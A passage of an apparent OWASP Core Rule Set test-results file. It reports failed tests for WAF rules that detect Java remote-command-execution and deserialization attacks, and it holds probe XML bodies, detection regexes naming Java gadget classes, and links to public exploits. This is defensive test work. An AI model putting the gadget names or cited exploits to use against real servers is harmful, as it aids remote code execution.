"phase=2 rule_id=944250 - Remote Command Execution: Suspicious Java method detected", "phase=2 rule_id=944250 - Remote Command Execution: Suspicious Java method detected" ]
    },
    "test" : {
      "test_id" : 16,
      "desc" : "XML attribute name includes keyworda java. and ProcessBuilder",
      "stages" : [ {
        "input" : {
          "dest_addr" : "127.0.0.1",
          "port" : 80,
          "headers" : {
            "Host" : "localhost",
            "User-Agent" : "OWASP CRS test agent",
            "Accept" : "text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5",
            "Accept-Encoding" : "gzip,deflate",
            "Accept-Language" : "en-us,en;q=0.5",
            "Content-Type" : "application/xml"
          },
          "method" : "POST",
          "uri" : "/post",
          "version" : "HTTP/1.1",
          "data" : "<?xml version=\"1.0\"?><xml><element java.ProcessBuilder=\"attribute_value\">element_value</element></xml>"
        },
        "output" : {
          "log" : {
            "no_expect_ids" : [ 944110 ]
          }
        }
      } ]
    },
    "tested_rule" : {
      "type" : "SecRule",
      "id" : 944110,
      "phase" : 2,
      "chain" : true,
      "comment_block" : {
        "type" : "CommentBlock",
        "comments" : [ {
          "type" : "Comment",
          "text" : " This rule is also triggered by the following exploit(s):"
        }, {
          "type" : "Comment",
          "text" : " [ Apache Struts vulnerability CVE-2017-5638 - Exploit tested: https://github.com/xsscx/cve-2017-5638 ]"
        }, {
          "type" : "Comment",
          "text" : " [ Apache Struts vulnerability CVE-2017-9791 - Exploit tested: https://www.exploit-db.com/exploits/42324 ]"
        }, {
          "type" : "Comment",
          "text" : " [ Apache Struts vulnerability CVE-2017-9805 - Exploit tested: https://www.exploit-db.com/exploits/42627 ]"
        }, {
          "type" : "Comment",
          "text" : " [ Java deserialization vulnerability/Apache Struts (CVE-2017-9805) ]"
        }, {
          "type" : "Comment",
          "text" : " [ Java deserialization vulnerability/Oracle Weblogic (CVE-2017-10271) ]"
        }, {
          "type" : "Comment",
          "text" : " [ SAP CRM Java vulnerability CVE-2018-2380 - Exploit tested: https://www.exploit-db.com/exploits/44292 ]"
        }, {
          "type" : "Comment",
          "text" : ""
        }, {
          "type" : "Comment",
          "text" : " Generic rule to detect processbuilder or runtime calls, if any of those is found and the same target contains"
        }, {
          "type" : "Comment",
          "text" : " java. unmarshaller or base64data to trigger a potential payload execution"
        }, {
          "type" : "Comment",
          "text" : " tested with https://www.exploit-db.com/exploits/42627/ and https://www.exploit-db.com/exploits/43458/"
        } ]
      },
      "variables" : {
        "type" : "Variables",
        "negated" : true,
        "count" : false,
        "variables" : [ {
          "type" : "CollectionVariable",
          "collection" : "ARGS",
          "key" : null
        }, {
          "type" : "CollectionVariable",
          "collection" : "ARGS_NAMES",
          "key" : null
        }, {
          "type" : "CollectionVariable",
          "collection" : "REQUEST_COOKIES",
          "key" : null
        }, {
          "type" : "CollectionVariable",
          "collection" : "REQUEST_COOKIES_NAMES",
          "key" : null
        }, {
          "type" : "SimpleVariable",
          "name" : "REQUEST_BODY"
        }, {
          "type" : "CollectionVariable",
          "collection" : "REQUEST_HEADERS",
          "key" : null
        }, {
          "type" : "CollectionVariable",
          "collection" : "XML",
          "key" : "/*"
        }, {
          "type" : "CollectionVariable",
          "collection" : "XML",
          "key" : "//@*"
        } ],
        "negated_variables" : [ ]
      },
      "operator" : {
        "type" : "Operator",
        "operator_type" : "rx",
        "pattern" : "(?:runtime|processbuilder)"
      },
      "actions" : {
        "type" : "Actions",
        "actions" : [ {
          "type" : "Action",
          "action_type" : "id",
          "value" : 944110
        }, {
          "type" : "Action",
          "action_type" : "phase",
          "value" : 2
        }, {
          "type" : "Action",
          "action_type" : "block"
        }, {
          "type" : "Action",
          "action_type" : "transform",
          "name" : "none"
        }, {
          "type" : "Action",
          "action_type" : "transform",
          "name" : "lowercase"
        }, {
          "type" : "Action",
          "action_type" : "msg",
          "value" : "Remote Command Execution: Java process spawn (CVE-2017-9805)"
        }, {
          "type" : "Action",
          "action_type" : "log_data",
          "value" : "Matched Data: %{MATCHED_VAR} found within %{MATCHED_VAR_NAME}"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "application-multi"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "language-java"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "platform-multi"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "attack-rce"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "paranoia-level/1"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "OWASP_CRS"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "OWASP_CRS/ATTACK-JAVA"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "capec/1000/152/248"
        }, {
          "type" : "Action",
          "action_type" : "ver",
          "value" : "OWASP_CRS/4.22.0-dev"
        }, {
          "type" : "Action",
          "action_type" : "severity",
          "value" : "Critical"
        }, {
          "type" : "Action",
          "action_type" : "chain"
        } ]
      }
    }
  }, {
    "test_rule" : "944120",
    "test_id" : 6,
    "test_path" : "REQUEST-944-APPLICATION-ATTACK-JAVA/944120.yaml",
    "description" : "XML element includes keyword ProcessBuilder.evil.clonetransformer",
    "cause" : "failed no_expect_ids check: 944120 was found",
    "result" : {
      "disposition" : {
        "type" : "Disposition",
        "action_type" : "continue"
      },
      "events" : [ "phase=2 rule_id=920273 - Invalid character in request (outside of very strict set)", "phase=2 rule_id=941100 - XSS Attack Detected via libinjection", "phase=2 rule_id=941320 - Possible XSS Attack Detected - HTML Tag Handler", "phase=2 rule_id=942131 - SQL Injection Attack: SQL Boolean-based attack detected", "phase=2 rule_id=942520 - Detects basic SQL authentication bypass attempts 4.0/4", "phase=2 rule_id=942431 - Restricted SQL Character Anomaly Detection (args): # of special characters exceeded (6)", "phase=2 rule_id=942432 - Restricted SQL Character Anomaly Detection (args): # of special characters exceeded (2)", "phase=2 rule_id=944120 - Remote Command Execution: Java serialization (CVE-2015-4852)", "phase=2 rule_id=944120 - Remote Command Execution: Java serialization (CVE-2015-4852)", "phase=2 rule_id=944120 - Remote Command Execution: Java serialization (CVE-2015-4852)", "phase=2 rule_id=944120 - Remote Command Execution: Java serialization (CVE-2015-4852)", "phase=2 rule_id=944240 - Remote Command Execution: Java serialization (CVE-2015-4852)", "phase=2 rule_id=944240 - Remote Command Execution: Java serialization (CVE-2015-4852)" ]
    },
    "test" : {
      "test_id" : 6,
      "desc" : "XML element includes keyword ProcessBuilder.evil.clonetransformer",
      "stages" : [ {
        "input" : {
          "dest_addr" : "127.0.0.1",
          "port" : 80,
          "headers" : {
            "Host" : "localhost",
            "User-Agent" : "OWASP CRS test agent",
            "Accept" : "text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5",
            "Accept-Encoding" : "gzip,deflate",
            "Accept-Language" : "en-us,en;q=0.5",
            "Content-Type" : "application/xml"
          },
          "method" : "POST",
          "uri" : "/post",
          "version" : "HTTP/1.1",
          "data" : "<?xml version=\"1.0\"?><xml><ProcessBuilder.evil.clonetransformer attribute_name=\"attribute_value\">value</ProcessBuilder.evil.clonetransformer></xml>"
        },
        "output" : {
          "log" : {
            "no_expect_ids" : [ 944120 ]
          }
        }
      } ]
    },
    "tested_rule" : {
      "type" : "SecRule",
      "id" : 944120,
      "phase" : 2,
      "chain" : true,
      "comment_block" : {
        "type" : "CommentBlock",
        "comments" : [ {
          "type" : "Comment",
          "text" : " Magic bytes detected and payload included possibly RCE vulnerable classes detected and process execution methods detected"
        }, {
          "type" : "Comment",
          "text" : " anomaly score set to critical as all conditions indicate the request try to perform RCE."
        } ]
      },
      "variables" : {
        "type" : "Variables",
        "negated" : true,
        "count" : false,
        "variables" : [ {
          "type" : "CollectionVariable",
          "collection" : "ARGS",
          "key" : null
        }, {
          "type" : "CollectionVariable",
          "collection" : "ARGS_NAMES",
          "key" : null
        }, {
          "type" : "CollectionVariable",
          "collection" : "REQUEST_COOKIES",
          "key" : null
        }, {
          "type" : "CollectionVariable",
          "collection" : "REQUEST_COOKIES_NAMES",
          "key" : null
        }, {
          "type" : "SimpleVariable",
          "name" : "REQUEST_BODY"
        }, {
          "type" : "CollectionVariable",
          "collection" : "REQUEST_HEADERS",
          "key" : null
        }, {
          "type" : "CollectionVariable",
          "collection" : "XML",
          "key" : "/*"
        }, {
          "type" : "CollectionVariable",
          "collection" : "XML",
          "key" : "//@*"
        } ],
        "negated_variables" : [ ]
      },
      "operator" : {
        "type" : "Operator",
        "operator_type" : "rx",
        "pattern" : "(?:clonetransformer|forclosure|instantiatefactory|instantiatetransformer|invokertransformer|prototypeclonefactory|prototypeserializationfactory|whileclosure|getproperty|filewriter|xmldecoder)"
      },
      "actions" : {
        "type" : "Actions",
        "actions" : [ {
          "type" : "Action",
          "action_type" : "id",
          "value" : 944120
        }, {
          "type" : "Action",
          "action_type" : "phase",
          "value" : 2
        }, {
          "type" : "Action",
          "action_type" : "block"
        }, {
          "type" : "Action",
          "action_type" : "transform",
          "name" : "none"
        }, {
          "type" : "Action",
          "action_type" : "transform",
          "name" : "lowercase"
        }, {
          "type" : "Action",
          "action_type" : "msg",
          "value" : "Remote Command Execution: Java serialization (CVE-2015-4852)"
        }, {
          "type" : "Action",
          "action_type" : "log_data",
          "value" : "Matched Data: %{MATCHED_VAR} found within %{MATCHED_VAR_NAME}"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "application-multi"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "language-java"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "platform-multi"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "attack-rce"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "paranoia-level/1"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "OWASP_CRS"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "OWASP_CRS/ATTACK-JAVA"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "capec/1000/152/248"
        }, {
          "type" : "Action",
          "action_type" : "ver",
          "value" : "OWASP_CRS/4.22.0-dev"
        }, {
          "type" : "Action",
          "action_type" : "severity",
          "value" : "Critical"
        }, {
          "type" : "Action",
          "action_type" : "chain"
        } ]
      }
    }
  }, {
    "test_rule" : "944120",
    "test_id" : 7,
    "test_path" : "REQUEST-944-APPLICATION-ATTACK-JAVA/944120.yaml",
    "description" : "XML attribute name includes keyword ProcessBuilder.evil.clonetransformer",
    "cause" : "failed no_expect_ids check: 944120 was found",
    "result" : {
      "disposition" : {
        "type" : "Disposition",
        "action_type" : "continue"
      },
      "events" : [ "phase=2 rule_id=920273 - Invalid character in request (outside of very strict set)", "phase=2 rule_id=941100 - XSS Attack Detected via libinjection", "phase=2 rule_id=941320 - Possible XSS Attack Detected - HTML Tag Handler", "phase=2 rule_id=942131 - SQL Injection Attack: SQL Boolean-based attack detected", "phase=2 rule_id=942520 - Detects basic SQL authentication bypass attempts 4.0/4", "phase=2 rule_id=942431 - Restricted SQL Character Anomaly Detection (args): # of special characters exceeded (6)", "phase=2 rule_id=942432 - Restricted SQL Character Anomaly Detection (args): # of special characters exceeded (2)", "phase=2 rule_id=944120 - Remote Command Execution: Java serialization (CVE-2015-4852)", "phase=2 rule_id=944120 - Remote Command Execution: Java serialization (CVE-2015-4852)", "phase=2 rule_id=944120 - Remote Command Execution: Java serialization (CVE-2015-4852)", "phase=2 rule_id=944120 - Remote Command Execution: Java serialization (CVE-2015-4852)", "phase=2 rule_id=944240 - Remote Command Execution: Java serialization (CVE-2015-4852)", "phase=2 rule_id=944240 - Remote Command Execution: Java serialization (CVE-2015-4852)" ]
    },
    "test" : {
      "test_id" : 7,
      "desc" : "XML attribute name includes keyword ProcessBuilder.evil.clonetransformer",
      "stages" : [ {
        "input" : {
          "dest_addr" : "127.0.0.1",
          "port" : 80,
          "headers" : {
            "Host" : "localhost",
            "User-Agent" : "OWASP CRS test agent",
            "Accept" : "text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5",
            "Accept-Encoding" : "gzip,deflate",
            "Accept-Language" : "en-us,en;q=0.5",
            "Content-Type" : "application/xml"
          },
          "method" : "POST",
          "uri" : "/post",
          "version" : "HTTP/1.1",
          "data" : "<?xml version=\"1.0\"?><xml><element ProcessBuilder.evil.clonetransformer=\"attribute_value\">element_value</element></xml>"
        },
        "output" : {
          "log" : {
            "no_expect_ids" : [ 944120 ]
          }
        }
      } ]
    },
    "tested_rule" : {
      "type" : "SecRule",
      "id" : 944120,
      "phase" : 2,
      "chain" : true,
      "comment_block" : {
        "type" : "CommentBlock",
        "comments" : [ {
          "type" : "Comment",
          "text" : " Magic bytes detected and payload included possibly RCE vulnerable classes detected and process execution methods detected"
        }, {
          "type" : "Comment",
          "text" : " anomaly score set to critical as all conditions indicate the request try to perform RCE."
        } ]
      },
      "variables" : {
        "type" : "Variables",
        "negated" : true,
        "count" : false,
        "variables" : [ {
          "type" : "CollectionVariable",
          "collection" : "ARGS",
          "key" : null
        }, {
          "type" : "CollectionVariable",
          "collection" : "ARGS_NAMES",
          "key" : null
        }, {
          "type" : "CollectionVariable",
          "collection" : "REQUEST_COOKIES",
          "key" : null
        }, {
          "type" : "CollectionVariable",
          "collection" : "REQUEST_COOKIES_NAMES",
          "key" : null
        }, {
          "type" : "SimpleVariable",
          "name" : "REQUEST_BODY"
        }, {
          "type" : "CollectionVariable",
          "collection" : "REQUEST_HEADERS",
          "key" : null
        }, {
          "type" : "CollectionVariable",
          "collection" : "XML",
          "key" : "/*"
        }, {
          "type" : "CollectionVariable",
          "collection" : "XML",
          "key" : "//@*"
        } ],
        "negated_variables" : [ ]
      },
      "operator" : {
        "type" : "Operator",
        "operator_type" : "rx",
        "pattern" : "(?:clonetransformer|forclosure|instantiatefactory|instantiatetransformer|invokertransformer|prototypeclonefactory|prototypeserializationfactory|whileclosure|getproperty|filewriter|xmldecoder)"
      },
      "actions" : {
        "type" : "Actions",
        "actions" : [ {
          "type" : "Action",
          "action_type" : "id",
          "value" : 944120
        }, {
          "type" : "Action",
          "action_type" : "phase",
          "value" : 2
        }, {
          "type" : "Action",
          "action_type" : "block"
        }, {
          "type" : "Action",
          "action_type" : "transform",
          "name" : "none"
        }, {
          "type" : "Action",
          "action_type" : "transform",
          "name" : "lowercase"
        }, {
          "type" : "Action",
          "action_type" : "msg",
          "value" : "Remote Command Execution: Java serialization (CVE-2015-4852)"
        }, {
          "type" : "Action",
          "action_type" : "log_data",
          "value" : "Matched Data: %{MATCHED_VAR} found within %{MATCHED_VAR_NAME}"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "application-multi"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "language-java"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "platform-multi"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "attack-rce"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "paranoia-level/1"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "OWASP_CRS"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "OWASP_CRS/ATTACK-JAVA"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "capec/1000/152/248"
        }, {
          "type" : "Action",
          "action_type" : "ver",
          "value" : "OWASP_CRS/4.22.0-dev"
        }, {
          "type" : "Action",
          "action_type" : "severity",
          "value" : "Critical"
        }, {
          "type" : "Action",
          "action_type" : "chain"
        } ]
      }
    }
  }, {
    "test_rule" : "944120",
    "test_id" : 23,
    "test_path" : "REQUEST-944-APPLICATION-ATTACK-JAVA/944120.yaml",
    "description" : "XML element includes keyword ProcessBuilder.evil.forclosure",
    "cause" : "failed no_expect_ids check: 944120 was found",
    "result" : {
      "disposition" : {
        "type" : "Disposition",
        "action_type" : "continue"
      },
      "events" : [ "phase=2 rule_id=920273 - Invalid character in request (outside of very strict set)", "phase=2 rule_id=941100 - XSS Attack Detected via libinjection", "phase=2 rule_id=941320 - Possible XSS Attack Detected - HTML Tag Handler", "phase=2 rule_id=942131 - SQL Injection Attack: SQL Boolean-based attack detected", "phase=2 rule_id=942520 - Detects basic SQL authentication bypass attempts 4.0/4", "phase=2 rule_id=942431 - Restricted SQL Character Anomaly Detection (args): # of special characters exceeded (6)", "phase=2 rule_id=942432 - Restricted SQL Character Anomaly Detection (args): # of special characters exceeded (2)", "phase=2 rule_id=944120 - Remote Command Execution: Java serialization (CVE-2015-4852)", "phase=2 rule_id=944120 - Remote Command Execution: Java serialization (CVE-2015-4852)", "phase=2 rule_id=944120 - Remote Command Execution: Java serialization (CVE-2015-4852)", "phase=2 rule_id=944120 - Remote Command Execution: Java serialization (CVE-2015-4852)", "phase=2 rule_id=944240 - Remote Command Execution: Java serialization (CVE-2015-4852)", "phase=2 rule_id=944240 - Remote Command Execution: Java serialization (CVE-2015-4852)" ]
    },
    "test" : {
      "test_id" : 23,
      "desc" : "XML element includes keyword ProcessBuilder.evil.forclosure",
      "stages" : [ {
        "input" : {
          "dest_addr" : "127.0.0.1",
          "port" : 80,
          "headers" : {
            "Host" : "localhost",
            "User-Agent" : "OWASP CRS test agent",
            "Accept" : "text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5",
            "Accept-Encoding" : "gzip,deflate",
            "Accept-Language" : "en-us,en;q=0.5",
            "Content-Type" : "application/xml"
          },
          "method" : "POST",
          "uri" : "/post",
          "version" : "HTTP/1.1",
          "data" : "<?xml version=\"1.0\"?><xml><ProcessBuilder.evil.forclosure attribute_name=\"attribute_value\">value</ProcessBuilder.evil.forclosure></xml>"
        },
        "output" : {
          "log" : {
            "no_expect_ids" : [ 944120 ]
          }
        }
      } ]
    },
    "tested_rule" : {
      "type" : "SecRule",
      "id" : 944120,
      "phase" : 2,
      "chain" : true,
      "comment_block" : {
        "type" : "CommentBlock",
        "comments" : [ {
          "type" : "Comment",
          "text" : " Magic bytes detected and payload included possibly RCE vulnerable classes detected and process execution methods detected"
        }, {
          "type" : "Comment",
          "text" : " anomaly score set to critical as all conditions indicate the request try to perform RCE."
        } ]
      },
      "variables" : {
        "type" : "Variables",
        "negated" : true,
        "count" : false,
        "variables" : [ {
          "type" : "CollectionVariable",
          "collection" : "ARGS",
          "key" : null
        }, {
          "type" : "CollectionVariable",
          "collection" : "ARGS_NAMES",
          "key" : null
        }, {
          "type" : "CollectionVariable",
          "collection" : "REQUEST_COOKIES",
          "key" : null
        }, {
          "type" : "CollectionVariable",
          "collection" : "REQUEST_COOKIES_NAMES",
          "key" : null
        }, {
          "type" : "SimpleVariable",
          "name" : "REQUEST_BODY"
        }, {
          "type" : "CollectionVariable",
          "collection" : "REQUEST_HEADERS",
          "key" : null
        }, {
          "type" : "CollectionVariable",
          "collection" : "XML",
          "key" : "/*"
        }, {
          "type" : "CollectionVariable",
          "collection" : "XML",
          "key" : "//@*"
        } ],
        "negated_variables" : [ ]
      },
      "operator" : {
        "type" : "Operator",
        "operator_type" : "rx",
        "pattern" : "(?:clonetransformer|forclosure|instantiatefactory|instantiatetransformer|invokertransformer|prototypeclonefactory|prototypeserializationfactory|whileclosure|getproperty|filewriter|xmldecoder)"
      },
      "actions" : {
        "type" : "Actions",
        "actions" : [ {
          "type" : "Action",
          "action_type" : "id",
          "value" : 944120
        }, {
          "type" : "Action",
          "action_type" : "phase",
          "value" : 2
        }, {
          "type" : "Action",
          "action_type" : "block"
        }, {
          "type" : "Action",
          "action_type" : "transform",
          "name" : "none"
        }, {
          "type" : "Action",
          "action_type" : "transform",
          "name" : "lowercase"
        }, {
          "type" : "Action",
          "action_type" : "msg",
          "value" : "Remote Command Execution: Java serialization (CVE-2015-4852)"
        }, {
          "type" : "Action",
          "action_type" : "log_data",
          "value" : "Matched Data: %{MATCHED_VAR} found within %{MATCHED_VAR_NAME}"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "application-multi"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "language-java"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "platform-multi"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "attack-rce"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "paranoia-level/1"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "OWASP_CRS"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "OWASP_CRS/ATTACK-JAVA"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "capec/1000/152/248"
        }, {
          "type" : "Action",
          "action_type" : "ver",
          "value" : "OWASP_CRS/4.22.0-dev"
        }, {
          "type" : "Action",
          "action_type" : "severity",
          "value" : "Critical"
        }, {
          "type" : "Action",
          "action_type" : "chain"
        } ]
      }
    }
  }, {
    "test_rule" : "944120",
    "test_id" : 24,
    "test_path" : "REQUEST-944-APPLICATION-ATTACK-JAVA/944120.yaml",
    "description" : "XML attribute name includes keyword ProcessBuilder.evil.forclosure",
    "cause" : "failed no_expect_ids check: 944120 was found",
    "result" : {
      "disposition" : {
        "type" : "Disposition",
        "action_type" : "continue"
      },
      "events" : [ "phase=2 rule_id=920273 - Invalid character in request (outside of very strict set)", "phase=2 rule_id=941100 - XSS Attack Detected via libinjection", "phase=2 rule_id=941320 - Possible XSS Attack Detected - HTML Tag Handler", "phase=2 rule_id=942131 - SQL Injection Attack: SQL Boolean-based attack detected", "phase=2 rule_id=942520 - Detects basic SQL authentication bypass attempts 4.0/4", "phase=2 rule_id=942431 - Restricted SQL Character Anomaly Detection (args): # of special characters exceeded (6)", "phase=2 rule_id=942432 - Restricted SQL Character Anomaly Detection (args): # of special characters exceeded (2)", "phase=2 rule_id=944120 - Remote Command Execution: Java serialization (CVE-2015-4852)", "phase=2 rule_id=944120 - Remote Command Execution: Java serialization (CVE-2015-4852)", "phase=2 rule_id=944120 - Remote Command Execution: Java serialization (CVE-2015-4852)", "phase=2 rule_id=944120 - Remote Command Execution: Java serialization (CVE-2015-4852)", "phase=2 rule_id=944240 - Remote Command Execution: Java serialization (CVE-2015-4852)", "phase=2 rule_id=944240 - Remote Command Execution: Java serialization (CVE-2015-4852)" ]
    },
    "test" : {
      "test_id" : 24,
      "desc" : "XML attribute name includes keyword ProcessBuilder.evil.forclosure",
      "stages" : [ {
        "input" : {
          "dest_addr" : "127.0.0.1",
          "port" : 80,
          "headers" : {
            "Host" : "localhost",
            "User-Agent" : "OWASP CRS test agent",
            "Accept" : "text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5",
            "Accept-Encoding" : "gzip,deflate",
            "Accept-Language" : "en-us,en;q=0.5",
            "Content-Type" : "application/xml"
          },
          "method" : "POST",
          "uri" : "/post",
          "version" : "HTTP/1.1",
          "data" : "<?xml version=\"1.0\"?><xml><element ProcessBuilder.evil.forclosure=\"attribute_value\">element_value</element></xml>"
        },
        "output" : {
          "log" : {
            "no_expect_ids" : [ 944120 ]
          }
        }
      } ]
    },
    "tested_rule" : {
      "type" : "SecRule",
      "id" : 944120,
      "phase" : 2,
      "chain" : true,
      "comment_block" : {
        "type" : "CommentBlock",
        "comments" : [ {
          "type" : "Comment",
          "text" : " Magic bytes detected and payload included possibly RCE vulnerable classes detected and process execution methods detected"
        }, {
          "type" : "Comment",
          "text" : " anomaly score set to critical as all conditions indicate the request try to perform RCE."
        } ]
      },
      "variables" : {
        "type" : "Variables",
        "negated" : true,
        "count" : false,
        "variables" : [ {
          "type" : "CollectionVariable",
          "collection" : "ARGS",
          "key" : null
        }, {
          "type" : "CollectionVariable",
          "collection" : "ARGS_NAMES",
          "key" : null
        }, {
          "type" : "CollectionVariable",
          "collection" : "REQUEST_COOKIES",
          "key" : null
        }, {
          "type" : "CollectionVariable",
          "collection" : "REQUEST_COOKIES_NAMES",
          "key" : null
        }, {
          "type" : "SimpleVariable",
          "name" : "REQUEST_BODY"
        }, {
          "type" : "CollectionVariable",
          "collection" : "REQUEST_HEADERS",
          "key" : null
        }, {
          "type" : "CollectionVariable",
          "collection" : "XML",
          "key" : "/*"
        }, {
          "type" : "CollectionVariable",
          "collection" : "XML",
          "key" : "//@*"
        } ],
        "negated_variables" : [ ]
      },
      "operator" : {
        "type" : "Operator",
        "operator_type" : "rx",
        "pattern" : "(?:clonetransformer|forclosure|instantiatefactory|instantiatetransformer|invokertransformer|prototypeclonefactory|prototypeserializationfactory|whileclosure|getproperty|filewriter|xmldecoder)"
      },
      "actions" : {
        "type" : "Actions",
        "actions" : [ {
          "type" : "Action",
          "action_type" : "id",
          "value" : 944120
        }, {
          "type" : "Action",
          "action_type" : "phase",
          "value" : 2
        }, {
          "type" : "Action",
          "action_type" : "block"
        }, {
          "type" : "Action",
          "action_type" : "transform",
          "name" : "none"
        }, {
          "type" : "Action",
          "action_type" : "transform",
          "name" : "lowercase"
        }, {
          "type" : "Action",
          "action_type" : "msg",
          "value" : "Remote Command Execution: Java serialization (CVE-2015-4852)"
        }, {
          "type" : "Action",
          "action_type" : "log_data",
          "value" : "Matched Data: %{MATCHED_VAR} found within %{MATCHED_VAR_NAME}"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "application-multi"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "language-java"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "platform-multi"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "attack-rce"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "paranoia-level/1"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "OWASP_CRS"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "OWASP_CRS/ATTACK-JAVA"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "capec/1000/152/248"
        }, {
          "type" : "Action",
          "action_type" : "ver",
          "value" : "OWASP_CRS/4.22.0-dev"
        }, {
          "type" : "Action",
          "action_type" : "severity",
          "value" : "Critical"
        }, {
          "type" : "Action",
          "action_type" : "chain"
        } ]
      }
    }
  }, {
    "test_rule" : "944120",
    "test_id" : 40,
    "test_path" : "REQUEST-944-APPLICATION-ATTACK-JAVA/944120.yaml",
    "description" : "XML element includes keyword ProcessBuilder.evil.instantiatefactory",
    "cause" : "failed no_expect_ids check: 944120 was found",
    "result" : {
      "disposition" : {
        "type" : "Disposition",
        "action_type" : "continue"
      },
      "events" : [ "phase=2 rule_id=920273 - Invalid character in request (outside of very strict set)", "phase=2 rule_id=941100 - XSS Attack Detected via libinjection", "phase=2 rule_id=941320 - Possible XSS Attack Detected - HTML Tag Handler", "phase=2 rule_id=942131 - SQL Injection Attack: SQL Boolean-based attack detected", "phase=2 rule_id=942520 - Detects basic SQL authentication bypass attempts 4.0/4", "phase=2 rule_id=942431 - Restricted SQL Character Anomaly Detection (args): # of special characters exceeded (6)", "phase=2 rule_id=942432 - Restricted SQL Character Anomaly Detection (args): # of special characters exceeded (2)", "phase=2 rule_id=944120 - Remote Command Execution: Java serialization (CVE-2015-4852)", "phase=2 rule_id=944120 - Remote Command Execution: Java serialization (CVE-2015-4852)", "phase=2 rule_id=944120 - Remote Command Execution: Java serialization (CVE-2015-4852)", "phase=2 rule_id=944120 - Remote Command Execution: Java serialization (CVE-2015-4852)", "phase=2 rule_id=944240 - Remote Command Execution: Java serialization (CVE-2015-4852)", "phase=2 rule_id=944240 - Remote Command Execution: Java serialization (CVE-2015-4852)" ]
    },
    "test" : {
      "test_id" : 40,
      "desc" : "XML element includes keyword ProcessBuilder.evil.instantiatefactory",
      "stages" : [ {
        "input" : {
          "dest_addr" : "127.0.0.1",
          "port" : 80,
          "headers" : {
            "Host" : "localhost",
            "User-Agent" : "OWASP CRS test agent",
            "Accept" : "text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5",
            "Accept-Encoding" : "gzip,deflate",
            "Accept-Language" : "en-us,en;q=0.5",
            "Content-Type" : "application/xml"
          },
          "method" : "POST",
          "uri" : "/post",
          "version" : "HTTP/1.1",
          "data" : "<?xml version=\"1.0\"?><xml><ProcessBuilder.evil.instantiatefactory attribute_name=\"attribute_value\">value</ProcessBuilder.evil.instantiatefactory></xml>"
        },
        "output" : {
          "log" : {
            "no_expect_ids" : [ 944120 ]
          }
        }
      } ]
    },
    "tested_rule" : {
      "type" : "SecRule",
      "id" : 944120,
      "phase" : 2,
      "chain" : true,
      "comment_block" : {
        "type" : "CommentBlock",
        "comments" : [ {
          "type" : "Comment",
          "text" : " Magic bytes detected and payload included possibly RCE vulnerable classes detected and process execution methods detected"
        }, {
          "type" : "Comment",
          "text" : " anomaly score set to critical as all conditions indicate the request try to perform RCE."
        } ]
      },
      "variables" : {
        "type" : "Variables",
        "negated" : true,
        "count" : false,
        "variables" : [ {
          "type" : "CollectionVariable",
          "collection" : "ARGS",
          "key" : null
        }, {
          "type" : "CollectionVariable",
          "collection" : "ARGS_NAMES",
          "key" : null
        }, {
          "type" : "CollectionVariable",
          "collection" : "REQUEST_COOKIES",
          "key" : null
        }, {
          "type" : "CollectionVariable",
          "collection" : "REQUEST_COOKIES_NAMES",
          "key" : null
        }, {
          "type" : "SimpleVariable",
          "name" : "REQUEST_BODY"
        }, {
          "type" : "CollectionVariable",
          "collection" : "REQUEST_HEADERS",
          "key" : null
        }, {
          "type" : "CollectionVariable",
          "collection" : "XML",
          "key" : "/*"
        }, {
          "type" : "CollectionVariable",
          "collection" : "XML",
          "key" : "//@*"
        } ],
        "negated_variables" : [ ]
      },
      "operator" : {
        "type" : "Operator",
        "operator_type" : "rx",
